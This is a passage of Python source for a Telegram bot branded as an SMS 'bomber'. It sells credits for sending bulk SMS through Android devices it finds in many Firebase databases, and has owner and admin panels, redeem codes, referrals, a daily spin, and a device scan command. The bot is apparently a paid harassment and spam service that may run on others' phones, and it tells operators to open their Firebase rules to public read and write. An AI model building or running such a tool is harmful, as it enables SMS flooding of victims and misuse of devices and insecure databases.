async def owner_redeem_del_menu(cq: CallbackQuery, state: FSMContext):
    await cq.answer()
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    codes = d.get("redeem_codes", {})
    if not codes:
        await cq.answer("❌ Koi code nahi hai!", show_alert=True)
        return

    rows = []
    for code in list(codes.keys())[:20]:
        rows.append([btn(code, f"owner:redeem:deldo:{code}", EMOJI_CROSS, "🗑")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:redeem:menu", EMOJI_GEAR, "🔙")])

    await cq.message.edit_text(
        f"{em(EMOJI_CROSS, '🗑')} <b>Delete Redeem Code</b>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=rows),
        parse_mode="HTML"
    )

@R.callback_query(F.data.startswith("owner:redeem:deldo:"))
async def owner_redeem_del_do(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    code = cq.data.split("owner:redeem:deldo:", 1)[1]
    if code in d.get("redeem_codes", {}):
        del d["redeem_codes"][code]
        save(d)
    await cq.answer("🗑 Code deleted!")
    await owner_redeem_menu(cq, state)

@R.callback_query(F.data == "owner:credits:add")
async def owner_credits_add_start(cq: CallbackQuery, state: FSMContext):
    await cq.answer()
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.add_credits_uid)
    await cq.message.edit_text(
        f"{em(EMOJI_MONEY, '💰')} <b>Add Credits</b>\n\n{sc('step 1/2')}: User ka Telegram ID bhejo:",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.add_credits_uid)
async def owner_credits_add_uid(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear()
        return
    try:
        uid = int(msg.text.strip())
        await state.update_data(credit_uid=uid)
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid ID bhejo.", parse_mode="HTML")
        return
    await state.set_state(S.add_credits_amount)
    await msg.answer(
        f"{em(EMOJI_MONEY, '💰')} <b>{sc('step 2/2')}</b>\n\nKitne credits add karne hain?",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.add_credits_amount)
async def owner_credits_add_amount(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    try:
        amount = int(msg.text.strip())
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid number bhejo.", parse_mode="HTML")
        return

    fsmd = await state.get_data()
    uid = fsmd.get("credit_uid")
    add_credits(uid, amount, d)
    save(d)
    await state.clear()

    try:
        await msg.bot.send_message(
            uid,
            f"{em(EMOJI_MONEY, '💰')} <b>Credits Added!</b>\n\n+{amount} credits mile hain!\n{em(EMOJI_MONEY, '💳')} Balance: <b>{get_user_credits(uid, d)}</b>",
            parse_mode="HTML"
        )
    except: pass

    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>{amount} credits</b> added to <code>{uid}</code>!\n{em(EMOJI_MONEY, '💳')} New Balance: <b>{get_user_credits(uid, d)}</b>",
        reply_markup=kb([(f"{sc('back')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:credits:deduct")
async def owner_credits_deduct_start(cq: CallbackQuery, state: FSMContext):
    await cq.answer()
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.deduct_credits_uid)
    await cq.message.edit_text(
        f"{em(EMOJI_MONEY, '💰')} <b>Deduct Credits</b>\n\n{sc('step 1/2')}: User ka Telegram ID bhejo:",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.deduct_credits_uid)
async def owner_credits_deduct_uid(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear()
        return
    try:
        uid = int(msg.text.strip())
        await state.update_data(deduct_uid=uid)
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid ID bhejo.", parse_mode="HTML")
        return
    await state.set_state(S.deduct_credits_amount)
    await msg.answer(
        f"{em(EMOJI_MONEY, '💰')} <b>{sc('step 2/2')}</b>\n\nKitne credits deduct karne hain?",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.deduct_credits_amount)
async def owner_credits_deduct_amount(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    try:
        amount = int(msg.text.strip())
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid number bhejo.", parse_mode="HTML")
        return

    fsmd = await state.get_data()
    uid = fsmd.get("deduct_uid")
    success = deduct_credits(uid, amount, d)
    save(d)
    await state.clear()

    if success:
        try:
            await msg.bot.send_message(
                uid,
                f"{em(EMOJI_WARNING, '⚠️')} <b>Credits Deducted!</b>\n\n-{amount} credits kat gaye.\n{em(EMOJI_MONEY, '💳')} Balance: <b>{get_user_credits(uid, d)}</b>",
                parse_mode="HTML"
            )
        except: pass
        await msg.answer(
            f"{em(EMOJI_CHECK, '✅')} <b>{amount} credits</b> deducted from <code>{uid}</code>!\n{em(EMOJI_MONEY, '💳')} New Balance: <b>{get_user_credits(uid, d)}</b>",
            reply_markup=kb([(f"{sc('back')}", "owner:home")]),
            parse_mode="HTML"
        )
    else:
        await msg.answer(
            f"{em(EMOJI_CROSS, '❌')} Insufficient credits! User ke paas sirf <b>{get_user_credits(uid, d)}</b> credits hain.",
            reply_markup=kb([(f"{sc('back')}", "owner:home")]),
            parse_mode="HTML"
        )

@R.callback_query(F.data == "owner:settings")
async def owner_settings(cq: CallbackQuery, state: FSMContext):
    await cq.answer()
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    settings = d.get("settings", {})

    text = (
        f"{em(EMOJI_GEAR, '⚙️')} <b>Bot Settings</b>\n\n"
        f"{em(EMOJI_GIFT, '🎁')} Referral Credits: <b>{settings.get('ref_credits', 3)}</b>\n"
        f"{em(EMOJI_CROWN, '👑')} Max Owners: <b>{settings.get('max_owners', 6)}</b>\n\n"
        f"<i>Settings change karne ke liye niche se select karein.</i>"
    )
    rows = [
        [btn("sᴇᴛ ʀᴇғᴇʀʀᴀʟ ᴄʀᴇᴅɪᴛs", "owner:settings:ref", EMOJI_GIFT, "🎁")],
        [btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")]
    ]
    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data == "owner:settings:ref")
async def owner_settings_ref(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.set_ref_credits)
    await cq.message.edit_text(
        f"{em(EMOJI_GIFT, '🎁')} <b>Set Referral Credits</b>\n\nReferral pe kitne credits dena hai?\n<i>Example: 5</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:settings")]),
        parse_mode="HTML"
    )

@R.message(S.set_ref_credits)
async def owner_settings_ref_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    try:
        credits = int(msg.text.strip())
        if credits < 0: raise ValueError
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid positive number bhejo.", parse_mode="HTML")
        return

    d.setdefault("settings", {})["ref_credits"] = credits
    d["premium"]["ref_credits"] = credits
    save(d)
    await state.clear()
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Referral Credits Updated!</b>\n\nAb har referral pe <b>{credits}</b> credits milenge.",
        reply_markup=kb([(f"{sc('back')}", "owner:settings")]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:activity")
async def owner_activity_log(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return

    log_entries = d.get("activity_log", [])[-20:]
    if not log_entries:
        text = f"{em(EMOJI_GEAR, '📜')} <b>Activity Log</b>\n\n<i>Koi activity nahi hai abhi tak.</i>"
    else:
        lines = [f"{em(EMOJI_GEAR, '📜')} <b>Recent Activity Log</b>\n"]
        for entry in reversed(log_entries):
            ts = fmt_time(entry.get("timestamp", 0))
            action = entry.get("action", "unknown")
            uid = entry.get("uid", 0)
            details = entry.get("details", "")
            lines.append(f"[{ts}] <code>{uid}</code> — <b>{action}</b> — {details}")
        text = "\n".join(lines)

    await cq.message.edit_text(
        text,
        reply_markup=kb([
            (f"{sc('refresh')}", "owner:activity"),
            (f"{sc('back')}", "owner:home")
        ]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:sms_history")
async def owner_sms_history(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return

    all_history = d.get("sms_history", {})
    total_entries = sum(len(v) for v in all_history.values())

    text = f"{em(EMOJI_STAR, '📋')} <b>Global SMS History</b>\n\nTotal Records: <b>{total_entries}</b>\n\n"
    text += "<i>Per-user history unke Stats mein available hai.</i>"

    await cq.message.edit_text(
        text,
        reply_markup=kb([(f"{sc('back')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.callback_query(F.data.in_({"user:home", "user:cancel"}))
async def user_home(cq: CallbackQuery, state: FSMContext):
    await cq.answer()
    await state.clear()
    d = load()
    uid = cq.from_user.id

    joined, missing = await user_joined_all(cq.bot, uid, d)
    if not joined:
        await cq.message.edit_text(force_join_text(missing), reply_markup=force_join_kb(missing), parse_mode="HTML", disable_web_page_preview=True)
        return

    if is_owner(uid, d):
        await cq.message.edit_text(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
        return
    if is_admin(uid, d):
        await cq.message.edit_text(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML")
        return
    if not can_use(uid, d):
        await cq.message.edit_text(get_access_denied_text(uid, d), parse_mode="HTML")
        return
    await cq.message.edit_text(user_home_text(uid, d), reply_markup=user_kb(), parse_mode="HTML")

@R.callback_query(F.data == "user:credits")
async def user_credits(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    credits = get_user_credits(uid, d)
    await cq.answer(f"💰 Credits: {credits}\nOwner: {SUPER_ADMIN_NAME}", show_alert=True)

@R.callback_query(F.data == "user:redeem")
async def user_redeem_start(cq: CallbackQuery, state: FSMContext):
    await cq.answer()
    await state.set_state(S.redeem_code)
    await cq.message.edit_text(
        f"{em(EMOJI_GIFT, '🎁')} <b>Redeem Code</b>\n\nApna redeem code enter karein:\n<i>Example: GIFTABC123</i>",
        reply_markup=kb([(f"{sc('cancel')}", "user:home")]),
        parse_mode="HTML"
    )

@R.message(S.redeem_code)
async def user_redeem_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    code = msg.text.strip().upper()
    await state.clear()

    codes = d.get("redeem_codes", {})
    if code not in codes:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid redeem code!", reply_markup=kb([(f"{sc('home')}", "user:home")]), parse_mode="HTML")
        return

    code_data = codes[code]
    if code_data.get("uses_left", 0) <= 0:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Ye code expire ho gaya hai!", reply_markup=kb([(f"{sc('home')}", "user:home")]), parse_mode="HTML")
        return

    if uid in code_data.get("used_by", []):
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Aap pehle se ye code use kar chuke hain!", reply_markup=kb([(f"{sc('home')}", "user:home")]), parse_mode="HTML")
        return

    credits = code_data["credits"]
    add_credits(uid, credits, d)
    code_data["uses_left"] = code_data.get("uses_left", 1) - 1
    code_data.setdefault("used_by", []).append(uid)
    save(d)

    await msg.answer(
        f"{em(EMOJI_GIFT, '🎉')} <b>Redeem Successful!</b>\n\n{em(EMOJI_MONEY, '💰')} +{credits} credits added!\n{em(EMOJI_MONEY, '💳')} Balance: <b>{get_user_credits(uid, d)}</b>",
        reply_markup=kb([(f"{sc('home')}", "user:home")]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "user:refer")
async def user_refer(cq: CallbackQuery, state: FSMContext):
    await cq.answer()
    d = load()
    uid = cq.from_user.id
    code = generate_user_refer_code(uid, d)
    save(d)
    ref_credits = d.get("settings", {}).get("ref_credits", 3)

    me = await cq.bot.get_me()
    await cq.message.edit_text(
        f"{em(EMOJI_STAR, '👥')} <b>Referral Program</b>\n\n"
        f"Apna referral code share karein aur har successful referral pe <b>{ref_credits}</b> credits paayein!\n\n"
        f"{em(EMOJI_GIFT, '🎁')} Your Code: <code>{code}</code>\n\n"
        f"{em(EMOJI_GEAR, '🔗')} Share Link:\n"
        f"https://t.me/{me.username}?start={code}",
        reply_markup=kb([(f"{sc('back')}", "user:home")]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "user:stats")
async def user_stats(cq: CallbackQuery, state: FSMContext):
    await cq.answer()
    d = load()
    uid = cq.from_user.id
    udata = d["users"].get(str(uid), {})
    stats = d.get("stats", {})

    await cq.message.edit_text(
        f"{em(EMOJI_STAR, '📊')} <b>Your Stats</b>\n\n"
        f"{em(EMOJI_MONEY, '💰')} Credits: <b>{udata.get('credits', 0)}</b>\n"
        f"{em(EMOJI_CHECK, '📤')} SMS Sent: <b>{udata.get('uses', 0)}</b>\n"
        f"{em(EMOJI_GEAR, '📅')} Joined: <b>{fmt_time(udata.get('joined_at', 0))}</b>\n\n"
        f"{em(EMOJI_STAR, '📈')} Bot Total Sent: <b>{stats.get('total_sent', 0)}</b>",
        reply_markup=kb([(f"{sc('back')}", "user:home")]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "user:sms_history")
async def user_sms_history(cq: CallbackQuery, state: FSMContext):
    await cq.answer()
    d = load()
    uid = cq.from_user.id
    history = d.get("sms_history", {}).get(str(uid), [])[-10:]

    if not history:
        text = f"{em(EMOJI_GEAR, '📜')} <b>Your SMS History</b>\n\n<i>Abhi tak koi SMS send nahi kiya.</i>"
    else:
        lines = [f"{em(EMOJI_GEAR, '📜')} <b>Your SMS History</b> (Last 10)\n"]
        for i, entry in enumerate(reversed(history), 1):
            ts = fmt_time(entry.get("timestamp", 0))
            num = entry.get("number", "Unknown")
            msg_preview = entry.get("message", "")[:30]
            status = entry.get("status", "unknown")
            status_icon = em(EMOJI_CHECK, "✅") if status == "sent" else em(EMOJI_CROSS, "🛑") if status == "stopped" else em(EMOJI_WARNING, "⏳")
            lines.append(f"{i}. [{ts}] {status_icon} <code>{mask_number(num)}</code> — {msg_preview}...")
        text = "\n".join(lines)

    await cq.message.edit_text(text, reply_markup=kb([(f"{sc('back')}", "user:home")]), parse_mode="HTML")

# =====================================================
# 💫 DAILY SPIN SYSTEM
# =====================================================
SPIN_MAX_CREDITS = 700
SPIN_COOLDOWN_HOURS = 24

def get_spin_data(uid: int, d: dict) -> dict:
    return d.get("users", {}).get(str(uid), {}).get("spin", {})

def can_spin(uid: int, d: dict) -> tuple[bool, int]:
    """Returns (can_spin, seconds_remaining)"""
    spin = get_spin_data(uid, d)
    last = spin.get("last_spin", 0)
    cooldown = SPIN_COOLDOWN_HOURS * 3600
    now = int(time.time())
    remaining = max(0, (last + cooldown) - now)
    return remaining == 0, remaining

def do_spin(uid: int, d: dict) -> int:
    """Execute spin, return credits won (1 to SPIN_MAX_CREDITS)."""
    # Weighted: smaller prizes more common
    prize = random.choices(
        population=[
            random.randint(1, 50),
            random.randint(50, 150),
            random.randint(150, 300),
            random.randint(300, 500),
            random.randint(500, 700),
        ],
        weights=[40, 30, 15, 10, 5],
        k=1
    )[0]
    prize = min(prize, SPIN_MAX_CREDITS)
    now = int(time.time())
    uid_key = str(uid)
    d.setdefault("users", {}).setdefault(uid_key, {})
    d["users"][uid_key].setdefault("spin", {})["last_spin"] = now
    add_credits(uid, prize, d)
    save(d)
    return prize

SPIN_EMOJIS = ["🎰", "🎲", "🎡", "🎪", "💫", "⭐", "🌟", "💥", "🔥", "💎"]
SPIN_SLOTS = ["🍒", "🍋", "🍊", "🍇", "⭐", "💎", "🔥", "7️⃣", "🎯", "💰"]

def spin_slot_display() -> str:
    return f"[ {random.choice(SPIN_SLOTS)} | {random.choice(SPIN_SLOTS)} | {random.choice(SPIN_SLOTS)} ]"

@R.callback_query(F.data == "user:spin")
async def user_spin_cb(cq: CallbackQuery):
    d = load()
    uid = cq.from_user.id
    ok, remaining = can_spin(uid, d)
    if not ok:
        hrs = remaining // 3600
        mins = (remaining % 3600) // 60
        await cq.answer(f"⏳ Next spin in {hrs}h {mins}m!", show_alert=True)
        return
    prize = do_spin(uid, d)
    bal = get_user_credits(uid, load())
    slot = spin_slot_display()
    emoji = random.choice(SPIN_EMOJIS)
    await cq.message.edit_text(
        f"<b>💫 Aʏᴜꜱʜ X Bᴏᴍʙᴇʀ V2 — DAILY SPIN</b>\n"
        f"<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n\n"
        f"{emoji} <b>Spinning...</b> {emoji}\n\n"
        f"<code>{slot}</code>\n\n"
        f"🎉 <b>Congratulations!</b>\n"
        f"💰 <b>You Won: +{prize} Credits!</b>\n"
        f"💳 <b>New Balance: {bal} CR</b>\n\n"
        f"<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n"
        f"<i>⏳ Next spin available in 24 hours</i>",
        reply_markup=kb([
            ("🏠 Home", "user:home"),
            ("💳 Buy Credits", "user:pricing")
        ]),
        parse_mode="HTML"
    )
    await cq.answer(f"🎉 You won {prize} credits!", show_alert=False)

@R.callback_query(F.data == "user:spin_check")
async def user_spin_check_cb(cq: CallbackQuery):
    d = load()
    uid = cq.from_user.id
    ok, remaining = can_spin(uid, d)
    if ok:
        await cq.message.edit_text(
            f"<b>💫 Aʏᴜꜱʜ X Bᴏᴍʙᴇʀ V2 — DAILY SPIN</b>\n"
            f"<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n\n"
            f"🎰 <b>Your Daily Spin is READY!</b>\n\n"
            f"<i>Spin to win up to <b>{SPIN_MAX_CREDITS} Credits</b> FREE!</i>\n"
            f"<i>Every spin gives random credits — max 700 CR per spin!</i>",
            reply_markup=kb([
                ("🎰 SPIN NOW!", "user:spin"),
                ("🏠 Home", "user:home")
            ]),
            parse_mode="HTML"
        )
    else:
        hrs = remaining // 3600
        mins = (remaining % 3600) // 60
        bal = get_user_credits(uid, d)
        await cq.message.edit_text(
            f"<b>💫 Aʏᴜꜱʜ X Bᴏᴍʙᴇʀ V2 — DAILY SPIN</b>\n"
            f"<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n\n"
            f"⏳ <b>Already spun today!</b>\n\n"
            f"🕐 <b>Next spin in: {hrs}h {mins}m</b>\n"
            f"💳 <b>Current Balance: {bal} CR</b>",
            reply_markup=kb([
                ("🏠 Home", "user:home"),
                ("💳 Buy Credits", "user:pricing")
            ]),
            parse_mode="HTML"
        )
    await cq.answer()

@R.callback_query(F.data == "user:pricing")
async def user_pricing(cq: CallbackQuery, state: FSMContext):
    await cq.answer()
    d = load()
    plans = d.get("pricing", {}).get("plans", [])

    if not plans:
        await cq.answer("❌ Abhi koi plan available nahi!", show_alert=True)
        return

    text = f"{em(EMOJI_MONEY, '💰')} <b>Buy Credits</b>\n\n"
    for plan in plans:
        text += f"{em(EMOJI_STAR, '📋')} <b>{plan['name']}</b>\n"
        text += f"   {em(EMOJI_MONEY, '💰')} Price: <b>{plan['price']} {plan.get('currency', 'INR')}</b>\n"
        text += f"   {em(EMOJI_GIFT, '🎁')} Credits: <b>{plan['credits']}</b>\n\n"

    rows = []
    for plan in plans:
        rows.append([btn_url(f"Buy {sc(plan['name'][:20])}", plan['payment_link'], EMOJI_MONEY, "💳")])
    rows.append([btn("ʙᴀᴄᴋ", "user:home", EMOJI_GEAR, "🔙")])

    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data == "user:info")
async def user_info(cq: CallbackQuery, state: FSMContext):
    await cq.answer()
    await cq.message.edit_text(
        f"{em(EMOJI_GEAR, 'ℹ️')} <b>SMS Blast Bot {_VERSION}</b>\n\n"
        f"{em(EMOJI_GEAR, '🤖')} Bot for sending bulk SMS via Firebase-connected Android devices.\n\n"
        f"{em(EMOJI_CROWN, '👤')} Developer: <a href='{SUPER_ADMIN_LINK}'>{SUPER_ADMIN_NAME}</a>\n"
        f"{em(EMOJI_BELL, '💬')} Support: Contact owner ({SUPER_ADMIN_NAME}) for any issues.\n\n"
        f"<i>Bot use karne ke liye credits chahiye. Referral se free credits paayein!</i>",
        reply_markup=kb([(f"{sc('back')}", "user:home")]),
        parse_mode="HTML",
        disable_web_page_preview=True
    )


@R.callback_query(F.data.in_({"owner:home", "owner:refresh"}))
async def owner_home(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    uid = cq.from_user.id
    if not is_owner(uid, d):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    await cq.answer()
    try:
        await cq.message.edit_text(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
    except TelegramBadRequest:
        pass

@R.callback_query(F.data.in_({"admin:home", "admin:refresh"}))
async def admin_home(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    uid = cq.from_user.id
    if not is_admin(uid, d):
        await cq.answer("🚫 Admin only!", show_alert=True)
        return
    await cq.answer()
    try:
        await cq.message.edit_text(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML")
    except TelegramBadRequest:
        pass

@R.callback_query(F.data == "noop")
async def noop(cq: CallbackQuery):
    await cq.answer()


@R.message(Command("scan", "rescan", "devices"))
async def cmd_manual_scan(msg: Message):
    d = load()
    uid = msg.from_user.id
    if not is_admin(uid, d):
        await msg.answer(f"{em(EMOJI_CROSS, '⛔')} Only Admins/Owners!", parse_mode="HTML")
        return
    scan_msg = await msg.answer(
        f"⚡ <b>ULTRA Scan Starting...</b>\n"
        f"<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n"
        f"🔥 Firebase DBs: <b>{len(d.get('firebases', []))}</b>\n"
        f"<i>Scanning all devices in parallel...</i>",
        parse_mode="HTML"
    )
    start = time.time()
    devices = await get_all_online_devices(d)
    duration = time.time() - start
    global CACHED_DEVICES, LAST_SCAN_TIME
    CACHED_DEVICES = devices
    LAST_SCAN_TIME = time.time()

    # Count per firebase
    fbs = d.get("firebases", [])
    fb_lines = []
    for fb in fbs[:10]:
        cnt = sum(1 for dv in devices if dv["fb_id"] == fb["id"])
        fb_lines.append(f"  {'🟢' if cnt>0 else '🔴'} {fb.get('label','?')[:20]}: <b>{cnt}</b> devices")
    fb_summary = "\n".join(fb_lines) if fb_lines else "  No Firebase DBs"

    try:
        await scan_msg.edit_text(
            f"⚡ <b>ULTRA Scan Complete!</b>\n"
            f"<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n"
            f"📡 <b>Total Devices:</b> <b>{len(devices)}</b>\n"
            f"🔥 <b>Firebase DBs:</b> <b>{len(fbs)}</b>\n"
            f"⏱ <b>Scan Time:</b> <b>{duration:.2f}s</b>\n"
            f"<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n"
            f"{fb_summary}",
            parse_mode="HTML"
        )
    except Exception:
        pass


@R.message(Command("testfb", "fbtest"))
async def cmd_test_firebase(msg: Message):
    """Test Firebase write to first 3 DBs — owner/admin only."""
    d = load()
    uid = msg.from_user.id
    if not (is_owner(uid, d) or is_admin(uid, d)):
        await msg.answer("⛔ Only Owner/Admin!", parse_mode="HTML")
        return
    fbs = d.get("firebases", [])
    if not fbs:
        await msg.answer("❌ <b>Koi Firebase URL nahi hai!</b>\nPehle /addfb se add karo.", parse_mode="HTML")
        return
    wait_msg = await msg.answer(
        f"🔬 <b>Firebase Write Test</b>\n"
        f"<code>━━━━━━━━━━━━━━━━━━━━━━</code>\n"
        f"🔧 Testing first {min(3, len(fbs))} Firebase DBs...\n"
        f"<i>Please wait...</i>",
        parse_mode="HTML"
    )
    lines = []
    for fb in fbs[:3]:
        ok, status, body = await test_firebase_write(fb["url"])
        icon = "✅" if ok else "❌"
        label = fb.get("label", fb["url"][:30])
        lines.append(
            f"{icon} <b>{label[:25]}</b>\n"
            f"   HTTP <code>{status}</code> | <code>{body[:60]}</code>"
        )
    result_text = "\n\n".join(lines)
    summary = "🟢 <b>Firebase writes working!</b>" if all(
        "✅" in l for l in lines
    ) else "🔴 <b>Firebase writes BLOCKED!</b>\nFix database rules — set read/write to <code>true</code>"
    try:
        await wait_msg.edit_text(
            f"🔬 <b>Firebase Write Test Results</b>\n"
            f"<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n\n"
            f"{result_text}\n\n"
            f"<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n"
            f"{summary}\n\n"
            f"💡 <i>Agar ❌ aa raha hai to Firebase Console → Rules → Change to:</i>\n"
            f'<code>{{"rules":{{".read":true,".write":true}}}}</code>',
            parse_mode="HTML"
        )
    except Exception as e:
        await msg.answer(f"Test done: {lines}", parse_mode="HTML")

async def main():
    bot = Bot(token=BOT_TOKEN)
    dp = Dispatcher(storage=MemoryStorage())
    dp.include_router(R)
    try:
        me = await bot.get_me()
    except TelegramUnauthorizedError:
        log.error("❌ [UNAUTHORIZED] BOT_TOKEN invalid / expired hai! Kripya @BotFather se valid token lein aur main.py me update karein.")
        await bot.session.close()
        return
    except Exception as e:
        log.error(f"❌ Telegram connection failed: {e}")
        await bot.session.close()
        return
    log.info(f"@{me.username} — SMS Blast Bot {_VERSION} started!")

    scanner_task = asyncio.create_task(background_firebase_scanner(bot))
    log.info("Background scanner task created")

    try:
        await bot.send_message(
            MAIN_OWNER,
            f"╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮\n"
            f"┃  ⚡ 𝐀𝐘𝐔𝐒𝐇 𝐁𝐋𝐀𝐒𝐓 𝐎𝐍𝐋𝐈𝐍𝐄 ⚡  \n"
            f"┃     ✦ ᴇɴɢɪɴᴇ ᴀᴄᴛɪᴠᴀᴛᴇᴅ ✦     \n"
            f"╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯\n\n"
            f"┌── ⟨ 🚀 𝐒𝐄𝐑𝐕𝐈𝐂𝐄 𝐒𝐓𝐀𝐓𝐔𝐒 ⟩ ──────┐\n"
            f"│ 🤖 𝐁𝐨𝐭        : @{me.username}\n"
            f"│ 🕒 𝐒𝐭𝐚𝐫𝐭𝐞𝐝    : <code>{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</code>\n"
            f"│ 🔄 𝐒𝐜𝐚𝐧𝐧𝐞𝐫    : 🟢 𝐀𝐮𝐭𝐨-𝐒𝐜𝐚𝐧 𝐀𝐜𝐭𝐢𝐯𝐞\n"
            f"│ ⚡ 𝐌𝐨𝐝𝐞       : ✦ 𝐔𝐥𝐭𝐫𝐚 𝐌𝐮𝐥𝐭𝐢-𝐓𝐡𝐫𝐞𝐚𝐝 ✦\n"
            f"│ 👥 𝐂𝐨𝐧𝐜𝐮𝐫𝐫𝐞𝐧𝐭 : 1000+ 𝐔𝐬𝐞𝐫𝐬\n"
            f"│ 📹 𝐕𝐢𝐝𝐞𝐨 𝐔𝐈   : 🟢 𝟏𝟎𝟎% 𝐀𝐜𝐭𝐢𝐯𝐞\n"
            f"└───────────────────────────────┘\n\n"
            f"👑 <b>Owner:</b> {SUPER_ADMIN_NAME}",
            parse_mode="HTML"
        )
    except Exception as e:
        log.warning(f"Owner notify: {e}")

    try:
        await dp.start_polling(bot, allowed_updates=dp.resolve_used_update_types())
    finally:
        await bot.session.close()

if __name__ == "__main__":
    threading.Thread(target=run_flask, daemon=True).start()
    asyncio.run(main())

#🗿 Bot Developer - @GOD_AYUSH
#🔰 Developer Channel - @Ayush_Hackz